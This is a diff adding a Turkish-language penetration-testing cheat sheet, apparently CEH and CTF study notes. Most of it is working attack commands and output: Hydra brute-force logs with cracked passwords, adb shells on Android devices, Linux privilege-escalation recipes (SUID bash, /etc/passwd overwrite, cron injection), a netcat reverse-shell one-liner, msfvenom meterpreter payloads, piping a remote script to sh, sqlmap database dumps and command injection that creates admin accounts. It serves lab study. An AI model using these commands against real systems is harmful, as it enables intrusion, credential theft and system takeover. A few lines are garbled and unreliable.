@@ -1,0 +1,511 @@
+#Nmap Kullanımı#
+!Sudo'suz Search atma
+-v -> Verbose
+-sA -> Güvenlik duvarı tespit eder.
+-sL -> Ana bilgisayar adlarını verir.
+-iL -> Bir dosyadan tarama yapmak için.
+-sS -> Syn paketi göndererek açık portları tarayabilir.
+-oG -> Çıktı almak için kullanılır
+-sU -> UDP paketi gönderir.
+-sN -> Icmp trafiği gönderir.
+-p -> Belirli port tarama
+-A > Agresif tarama
+-Pn -> Icmp kontrol etmeksizin tarama yapar.
+---
+Örnek kullanım ve çıktıları
+nmap -sV -sC -A -Pn 192.168.187.0/24
+---
+Version tespiti için Örnek Çıktı                            
+PORT    STATE SERVICE VERSION
+389/tcp open  ldap    OpenLDAP 10.0.X - 20348.X
+80/tcp open   Mercury Mercury 7.0
+---
+WampServer tespiti için
+nmap -T4 -A -p 80,443 *172.20.0.16* -> Block Verebilirsin yerine
+Merkuri servisi için tespit
+nmap -T4 -A -p 80,443,8080 172.7.7.7 -> 7'alanı değiştirilmeli.
+---
+FQDN ve DC'ye yönelik Data elde etmek için;
+nmap -p 389 --script ldap-rootdse 192.168.X.X
+Script içerikleri için NseDocs sayfasından yararlanabilirsin.
+Haricinde Ldapsearch ile de kontrol sağlanabilir.
+ldapsearch -x -b "dc=AdminTeam,dc=com" -H ldap://192.168.178.29 -D "cn=admin,dc=AdminTeam,dc=com" -W
+ECCEH sınavında da kullanabilirsin.
+-445 Port'una yönelik çalıştırdığın Script ile de veri elde edebilirsin.
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+Hydra aracının kullanımı
+Hydra Brute Force attacklar için kullanılmaktadır. XHydra üzerinden GUI'den de tarama başlatılabilir.
+ hydra -l user -P passlist.txt ftp://192.168.0.1
+ hydra -l admin -p password ftp://[192.168.0.0/24]/
+ hydra -L logins.txt -P pws.txt -M targets.txt ssh
+-v -> Verbose
+----
+#RDP Servisine yönelik BruteForce Yapma#
+hydra -l User -P password.txt IP rdp
+hydra -l User -P password.txt rdp://IP
+
+Örnek Brute Force Log'u
+hydra -l msfadmin-2bb -P /root/Masaüstü/pass.txt 192.168.187.153 rdp 
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-29 15:54:06
+[INFO] Reduced number of tasks to 1
+[DATA] max 1 task per 1 server, overall 1 task, 4 login tries (l:1/p:4), ~4 tries per task
+[DATA] attacking rdp://192.168.187.153:3389/
+[3389][rdp] host: 192.168.187.153   login: msfadmin-2bb   password: 407ea
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-29 15:54:07
+-----
+RDP kırma işlemi sonrasında Windows makine üzerinden işlem yapabileceğin gibi, FreeRDP, Xrdp gibi araçlarla bağlantı kurabilirsin.
+RDP üzerinden sürükleyerek dosya aktarımı yapabilirsin.
+--
+Hash hesaplamak içinde HashCalc aracını kullanabilirsin.
+--------
+###SSH Servisine yönelik Brute Force yapma##
+Remote Login SSH ya da Telnet
+
+hydra -L User.txt -P pass.txt 192.168.187.153 ssh
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-29 15:54:06
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 250 login tries (l:1/p:4), ~4 tries per task
+[DATA] attacking ssh://192.168.187.153:22/
+22[ssh] host: 192.168.187.153   login: root	  password: H0*ea497
+22[ssh] host: 192.168.187.153   login: toor       password: 407xy*m3
+22[ssh] host: 192.168.187.153   login: msfadmin   password: @l*ae101
+22[ssh] host: 192.168.187.153   login: 3bb        password: 0n*fx203
+22[ssh] host: 192.168.187.153   login: 2bb        password: 3*wwlo03
+5 of 5 target successfully completed, 5 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-29 15:54:07
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+Mobile Device Exploit
+Mobil Cihazlara yönelik atak yapmak için Phonesploit aracını ya da adb dosya betiğini kullanabilirsin.
+Mobil cihazlar genellikle 5555 Portunda çalışmaktadır.
+--
+Bu sebeple ilk yapacağın işlem "5555" portunu taramak olacaktır.
+nmap IP/24 -p 5555 
+--
+Bağlantı kurmak için;
+adb connect IP:5555
+--
+Shell almak için,
+adb shell
+---
+Genellikle CTF'lerde sdcart ya da Music klasörüne ekleme yapılır.
+cd,ls gibi komutlarla içeriğini görüntüleyebilirsin.
+adb pull /sdcart/scan /home Bağlantı kurmadığın bir kabuk üzerinde çalıştırman gerekiyor. Permission hatası içinde Sudo komutunu kullan.
+----
+Örnek çalıştırma
+*adb connect 192.168.1.103:5555
+*daemon not running; starting now at tcp:5037
+*daemon started successfully
+*connected to 192.168.1.103:5555
+
+adb shell
+└──╼ $adb pull /sdcard/Android/data /home
+└──╼ $sudo adb pull /sdcard/Android/data /home
+
+Örnek Check
+Dosyayı çektikten sonra Linux üzerinde Check edebilirsin.
+└──╼ $cat flag.txt
+F!Agxx
+┌─[user@parrot]─[/home/data]
+└──╼ $cat flag1.txt
+X ler onemsiz
+┌─[user@parrot]─[/home/data]
+└──╼ $cat Br^V0.txt 
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+##CVE Tespiti için###
+CVE Zafiyet açık taraması için Nmap,OpenVas,Nessus gibi araçlar kullanılabilir.
+Web üzerinde ki açıklar için Skipfish, Zaproxy gibi araçlar da kullanabilirsin.
+--
+OpenVas ile bulabilmek için OpenVas'ı başlat. 
+Verdiği URL'e git, Credential Admin/Password
+---
+Scans -> Task
+Task Wizard üzerinde IP'yi gir
+Result For alanından çıktıyı görebilirsin.
+---
+Benzer işlem NMAP üzerinden de gerçekleştirilebilir.
+nmap -sV --script vulners 192.168.187.153
+Örnek Çıktı
+|     CVE-2015-5986    7.1    https://vulners.com/cve/CVE-2015-5986
+|     CVE-2010-3615    5.0    https://vulners.com/cve/CVE-2010-3615
+|     CVE-2006-0987    5.0    https://vulners.com/cve/CVE-2006-0987
+                       ...
+|_    CVE-2020-7068    5.0    https://vulners.com/cve/CVE-2020-7068
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+#Openstego
+Veri çıkarma aktivitelerinde hit eder, a.Jpg dosyasında gizlenmiş veri için kullanılır. Şifre Imagination olabilir.
+Openstego aç
+Input kısmına png'yi yapıştır.
+Output kısmı çıktı alacağın yer
+Password kısmına "Imagination" yapıştır.
+------
+#SNOW
+Snow aracı ile dakikalar içinde .txt içeriğini değiştirebilirsin
+Txt içeriğinde yer alan data aslında gözükmemektedir.
+
+maddy.txt -> İçeriğinde normalWde farklı birşey yazmaktadır. Ancak içeriğine gizlenen veri ile içeriği gizlenebilir. -p alanından sonra gelen kısım şifresidir.
+
+snow -C -p "@777" maddy.txt
+
+Password alanına soruda bulduğun datayı yapıştır.
+---
+#Hashcalc
+Hashcalc ile hash hesaplama yapabilirsin.
+---
+#Veracrypt
+Disk şifreleme aracı
+Belirli bir dizini farklı bir disk mount eder gibi şifreme yapar.
+Çözümlemek için, Disk birimi seç Select File ile datayı ver şifreye ekle ve çıktıyı al
+---
+#Crackhashed
+Crackstation ya da Hashes alanında Hash'ler kırılabilir.
+---
+BC Text Encoder#
+.txt Decode için yine kullanılabilir.
+---
+Cryptool
+RC4,DES Encryption yapar
+---
+ECB Crypted
+FTP.IP.hes | ECB
+şifre var ise soruda verilir yoksa verilmez
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+#SMB üzerinde ki açıklar için NMAP ile tarama yapılabilir.
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP
+
+#SMB Client Kullanım.
+smbclient — no-pass //192.168.187.153/tmp
+
+Hata alınır ise bu şekilde kullanılabilir
+smbclient //192.168.187.153/tmp -U msfadmin --option='client min protocol=NT1'
+
+SMBMap üzerinden gerçekleştirilecek kullanılmlar.
+smbmap -H 192.168.187.153 -u msfadmin -p msfadmin -R 
+smbmap -H 192.168.187.153 -u msfadmin -p msfadmin --download /msfadmin/msfadmin/h@ckr00t.txt
+smbmap -H 192.168.187.153 -u msfadmin -p msfadmin --download /msfadmin/msfadmin/sshauthorised.keys
+
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+#Privelege Escalation##
+#"Privesc-Ricki"
+Yetki yükseltme aşamaları için Omuz sörfü vs görürsen ilk deneyeceğin nokta
+sudo -i olmalıdır.
+----
+İlk önce nmap ile tarayıp, SSH ile sunucuya girmelisin.
+#Örnek Pkexec
+Pwnkit CVE-2021-4034
+cd /tmp
+git clone https://.../CVE
+make
+./cve-2021....
+you root
+----
+"nfscommonprivesc"
+nfscommon yetki yükseltme
+ilk önce SSH ile sunucuya bağlan,
+
+nmap -sV -p 2049 IP/24
+sudo apt-get install nfs-common
+showmount -e Target_IP bunun sonucunda dizinler gözükür.
+nmap -sV --script=nfs-showmount Target IP -> Check edebilirsin.
+mdkir /tmp/nfs -> Kendi cihazında çalıştır.
+
+1.Yol
+sudo mount -t nfs IP/home /tmp/nfs -> Kendi cihazında yer alan /tmp/nfs'i karşı tarafa mount ettin
+sudo cp /bin/bash .
+sudo chmod +s bash
+
+ssh ubuntu@10.10.10.10
+cd home
+./bash -p
+-Root
+
+2.Yol
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf  
+chmod +s shell.elf
+ssh sonrası ./shell.elf ile çalıştır. Root'sun
+find / -name "a.txt"
+
+----
+Harici Privesc yöntemleri
+
+find / -perm /4000 2>/dev/null -> Komutu ile root yetkisi ile çalışan araçları görüntüleyebilirim.
+Find aracı root olarak kullanılıyorsa ;
+find . -exec '/bin/bash' \; komutu ile root olunabilir.
+---
+-Cp komutunu root olarak çalıştırabilirsen Shadow dosyalarını
+"cp shadow /tmp" komutu ile tmp dizinine kopyala.
+Johntheripper aracı ile hash kırma denemesi yapabilirim.
+----
+/Etc içerisinde bulunan crontab ile sürekli çalıştırılan programlar üzerinde işlem gerçekleştirebilirim.
+--
+/etc/passwd içerisine erişim sağlayabilirsem burada ki kullanıcıları kopyala
+openssl passwd -1 -salt kali 123456 düzeninde bir kullanıcı ekle
+Burada hashli halini kopyalıyorum.
+Python simplehttpserver ile oluşturduğum metni karşı tarafa aktarıyorum.
+wget http://192.168.139.176:4321/passwd ile tmp içersinie aktarıyorum.
+cp passwd /etc/passwd olarak kopyalıyorum.
+Eklenen kullanıcı ile giriş sağlıyorum.
+----------------------------------------------
+Php dosyası eklenmez ise php dosyası açılıp başına GIF98 ibaresi eklenebilir.
+----
+-------------------------------
+Spawning a shell throught python
+python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+-------------------------------
+Find binaries that have suid bit set (root)
+find / -perm -u=s -type f 2>/dev/null
+-------------------------------
+Set what a user has on target with regards to permissions
+find /group [user] 2>/dev/null
+-------------------------------
+Find super users and what they can do
+cat /etc/sudoers
+-------------------------------
+https://gtfobins.github.io/gtfobins/nmap/
+Nmap ile root erişimi kazanma
+-------------------------------
+Bilgi toplama aşaması
+***********************
+/etc/shadow içerisinde kullanıcı adı ve şifreler bulunmaktadır.
+arp -a komutu ile mac adreslerini görebiliriz.
+ip route komutu ile yönlendirmeleri görebiliriz.
+locate password komutu ile şifrelerle ilgili bilgi sahibi olabiliriz.
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \. Bu komut ile tüm dosyaları tarayıp içerisinde password geçen kelimeleri görüntüleyebiliyoruz.
+find / -name password 2> /dev/null komutu ile içerisinde şifre geçen dizinleri görebiliriz.
+find / -name id_rsa 2> /dev/null komutu ile SSH bağlantısı kurmamıza olanak sağlar.
+history komutuna da bakarsak buradan bilgi alabiliriz.
+--------------------------------
+Hazır script indirip burada işlem yapıp yapamayacağımıza da bakmamız gerekmektedir.
+-Pentest aşamasında wget komutu var mı yok mu ona bakmamız gerekmektedir.Fakat bunun için network bağlantımız olmalıdır.
+Linux exploit suggester,Linpeas,Linenum araçlarını kullanarak işlem yapabiliriz.
+--------------------------------
+"sudo -l" komutu ile root kullanıcısı ile erişim sağlayabileceğimiz uygulamaları görüntülüyoruz.
+Burada komut çalıştırmak için sudo /usr/bin/vim -c '!/bin/sh' kullanılabilir.
+-------------------------------------
+##CRONTAB## 
+-Burada düzenli olarak çalışan programlar hakkında bilgi sahibi olmaktayız.
+-Burada ki yıldızların sayısına bağlı olarak "Crontab guru" aramasının ardından kaç dakikada bir çalışacağını görüntüleyebilirdik.
+-/etc/cron.d - /etc/crontab dizinlerinde bulunmaktadır.Burada bulunan dosyaların içerisine bir shell kodu gizleyip işlem gerçekleştirebiliriz.
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
+chmod +x /home/user/overwrite.sh
+Kopyalama işleminin ardından
+/tmp/bash -p
+Komutun çalıştırıp root oluyoruz.
+-------------------------------------
+#LFI İşlemlerini kontrol et İnit-14' Görsel#
+-------------------------------------
+https://github.com/swisskyrepo/PayloadsAllTheThings Buradan gerekli Payloadları deneyebiliriz.
+-------------------------------------
+#CURL Üzerinden istek atma#
+POST EKLEME (CURL)
+**curl -X POST 'http://10.52.164.17/users/register' -H 'Content-Type: application/json' -d '{"name": "JH", "username": "8754", "password": "@#!" , "email" : ""}'
+--------------------------------------
+Netcat dinleme Code Injection
+Burp üzerinden passwd kısmına ; ile eklenip yapılır.
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2>&1|nc 10.52.164.34 4444 >/tmp/f
+---------------------------------------
+/etc/passwd Kullanıcı ekleme
+perl -le 'print crypt("JH8754", "@#!")'
+Komutu ile hash değerini elde edebiliriz.
+Hash değerini root üzerinde ki gibi yazdıktan sonra
+echo "Komut" >> passwd komutu ile yazdırıyorum.
+------
+Wpscan üzerinden tarama gerçekleştirme
+wpscan --url https://10.0.2.5:12380/blogblog/ --disable-tls-checks --usernames john --passwords fasttrack.txt -t 100 --password-attack wp-login
+----------------------------------------
+MSFVENOM Shell oluşturma
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=4343 -f raw > myshell.php
+----------------------------------------
+Linux Exploit Suggester
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | -O les.sh
+
+LinPeas
+curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh
+
+LinEnum
+https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+-----------------------------------------
+nmap -p 445 --script=smb-enum-users.nse,smb-enum-shares.nse 10.10.99.173
+Nmap ile script taraması yapmak.
+Mount komutu ile tüm bilgileri kendimize indirebiliriz.
+---------------------------------------------
+NC bağlantısı üzerinde CPFR ve CPTO komutlarını kullanarak kopyalama işlemi gerçekleştirebliriz.
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+#RemoteAcessTrojan#
+Farklı türleri yer almakta olup çıktıları aşağıda ki gibidir
+NJRAT 5552 Portunda çalışır Beş'e dikkat et
+Sol atta yer alan Build alanından çalıştırılır. gerekli data verildikten sonra
+Theef RAT 6703 Portunda çalışır.
+Anahtara'a basip işlem yapabilirsin
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+#DIE&PEID#
+Malware'ler üzerine uygulanan paketleme ve gizleme işlemleri için PEID kullanılır.
+PEID aracını çalıştırırsın, ... içerisinden zararlıyı ekleyebilrisin.
+Benzer şekilde
+DIE aracını çalıştırırsın ... zararlıyı eklersin
+Hashes alanında gerekli bilgiyi görebilirsin.
+Hashes alanından Örnek Çıktı aşağıda ki gibidir
+Sayı	Ofset	Adres		Boyut	Tür	Dizge		Version
+0	58	000c		LOAD(0)	05	A	Rfh-c	2.37
+1	64	54ec		LOAD(0)	05	A	h/bin	2.37
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+#WireShark Komut#
+Credential Tespiti
+http.request.method == POST
+How Many Machines
+tcp.flags.sync==1 and tcp.flags.ack==0
+----
+DDOS Attack Tespiti
+tcp.flags.syn==1 and tcp.flags.ack==0
+When machine DOS tcp.flags.syn==1
+Statistics
+IPV4 Statistics
+Source and Dest IP
+Bir kaynaktan gelen trafiği öğrenme
+ip.dst == 19.5.5.4
+---
+IOT
+MQ9TT Search
+Publish Message
+MQ Telemetry -> Message Length
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+#SQL MAP Using#
+SQL Database üzerinden Dump alma
+
+-p parametresi ile parametre belirtebilirsin.
+sqlmap -u "http://192.168.187.149/sqli/example4.php?id=2" -p id --dbs
+sqlmap -u "http://192.168.187.149/sqli/example4.php?id=2" -p id -D exercises -tables  
+-p olmadan kullanım
+sqlmap -u "http://192.168.187.149/sqli/example4.php?id=2" -d (y83 -T-users --column
+Örnek Çıktı:
+Database: exercises
+Table: users
+[5 columns]
++---------+-------------+
+| Column  | Type        |
++---------+-------------+
+| age     | int(11)     |
+| groupid | int(11)     |
+| id      | int(11)     |
+| name    | varchar(50) |
+| r5ec    | varchar(50) |
++---------+-------------+
+
+--Cookie üzerinden tarama gerçekleştirme
+Kaynak koduna geç Network Headers alanından Cookie ile ilerle.
+
+Örnek Kullanım
+sqlmap -u http://192.168.187.154/vulnerabilities/sqli/?id=3 --cookie="PHPSESSID=ki993ru0l51ddm0man5kscjht1; security=low" -D Test -T info --dump
+Database: Test
+Table: info
+[4 entries]
++----+---------+-----+-------+---------+
+| id | groupid | age | name  | passwd  |
++----+---------+-----+-------+---------+
+| 1  | 10      | 10  | admin | qwerty  |
+| 2  | 0       | 30  | root  | uiop    | |
++----+---------+-----+-------+---------+
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+Directory Traversal&Exploit
+Web app. ürünleri içerisinde yer alan Flag'leri genellik /flag.txt dizinine saklarlar.
+Wordpress arayüzlerinde Wpscan aracını kullanabilirsin.
+Dirb,Dirbuster ve gobuster gibi araçlar ile dizin taraması gerçekleştirebilirsin.
+dirb IP&Http://
+Örnek Kullanım ve Çıktı
+dirb training.192.168.187.153 -X .txt
+Scanning URL: http://192.168.187.153/ ----
++  http://192.168.187.153/index*M@.txt (CODE:200|SIZE:891)                      
++ http://192.168.187.153/d(*phpinfo.txt (CODE:200|SIZE:48119)    
++  http://192.168.187.153/index*y5.txt (CODE:200|SIZE:891)                      
++ http://192.168.187.153/phpinfo*35.txt (CODE:200|SIZE:48119) 
+----------------------
+Bir sitenin şu sayfasında bir veri var gibi bir soru gelirse kaynak kodu alanına mutlaka bak.
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>Damn Vulnerable Web App (DVWA) v1.0.7 :: Vulnerability: File Inclusion</title>
+<link rel="stylesheet" type="text/css" href="../../dvwa/css/B$#.css" />
+<link rel="icon" type="\image/ico" href="../../98TY.ico" />
+Exploit
+whatweb kullanarak sayfa hakkında bilgi toplayabilirsin.
+-------
+Searchsploit
+Searchsploit -m 37237.c
+gcc 4732.c samba.exploit
+./ ile çalıştır.
+Searchsploit -m 37237.py
+python 37237.py ile çalıştır.
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+aircrack-ng 9.cap
+-> BSSID değerini verir.
+aircrack-ng -w "password.txt" -b "bssid" a.cap WPA2
+--------------------------------------------------------------------------
+--------------------------------------------------------------------------
+Some extra work
+
+H^(ker@EC
+Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
+Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
+
+4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
+			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
+File Upload örnek DVWA
+5- Command Injection-  | net user  (Find users)
+ 		       | dir C:\  (directory listing)
+                       | net user H^(ker /Add  (Add a user) @ sonrası e ve c yapıştır.
+		       | net user Test      (Check a user)
+		       | net localgroup Administrators H^(ker/Add   (To convert the test account to admin)
+		       | net user H^(ker     (Once again check to see if it has become administrator)
+Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
+
+6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.10.10.10 (all info)
+				  enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
+1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
+2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16
+3- SNMP enum using nmap-  nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
+                          snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot
+4- DNS recon/enum-  dnsrecon -d www.google.com -z
+
+
+#File Upload#
+Zaproxy ile tarama yapar
+
+msfconsole in one tab next in new tab
+msfvenom -p php/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw >exploit.php
+use exploit/multi/handler or use 30
+set payload php/meterpreter/reverse_tcp
+Set LHOST ipadd
+
+Upload a fle you created as exploit.php
+Open terminal and type run once you get url type url in brower you get meterpreter session then type ls get the files.
+----
+SSH üzerinden dosya çekme
+scp admin@IP :C/Windows 
+---
+Rdesktop ile RDP kurabilirsin
+rdesktop IP -k tr -z -u Vagrant -p Vagrant
+----
+find / -name "3c_.txt"
+3c dikkat et verada işe yarar.  
+locate 3c_.txt  
+/usr/lib/llvm-11/build/utils/lit/tests/Inputs/shtest-format/C0un-feature.txt
+/usr/lib/llvm-9/build/utils/lit/tests/Inputs/shtest-format/xfail-feature.txt
+/usr/share/dirb/wordlists/vulns/fatwireC!L.txt
+/usr/share/dirb/wordlists/vulns/netware.txt
+-----
+dirb http://192.168.187.153/ /usr/share/wordlists/dirb/common.txt | grep CODE:200
